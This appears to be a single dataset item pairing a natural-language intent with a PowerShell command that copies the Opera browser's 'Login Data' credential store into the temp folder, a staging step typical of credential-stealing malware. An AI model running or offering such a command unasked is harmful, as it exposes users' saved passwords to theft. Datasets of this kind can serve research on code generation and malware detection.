# Natural language intent:
# Copy the Opera browser's login data to the temporary folder.

Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data" -Destination $env:temp
